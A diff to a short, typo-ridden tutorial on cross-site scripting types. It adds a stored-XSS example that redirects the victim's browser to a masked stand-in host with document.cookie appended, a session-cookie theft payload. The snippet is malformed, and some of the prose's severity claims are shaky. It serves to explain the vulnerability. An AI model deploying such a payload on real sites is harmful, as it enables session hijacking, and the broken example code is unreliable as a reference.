@@ -14,6 +14,13 @@ Cross site scritping can be classifed into 3 major categories as listed below:
 
 It is also called as persistence XSS which is considered to be very harmful XSS vulnerability. This involves attacker injecting malicious javascript code in the application which results in storing of those scripts at web server database end. Whenever any other other tries to access data in the same application then the user gets stored malicious script by querying database which is highly vulnerable.
 
+Example :
+```
+<script>
+   <alert>document.location="http://***.com"+document.cookie </alert>
+</script>
+```
+
 ###Reflected XSS:
 
 In this XSS vulnearbility the javascript injected to the application gets reflected back and gets executed in the victims browser hence revealing crucial information(session cookie) to the attacker. It is not considered to be highly vulnearble XSS type.
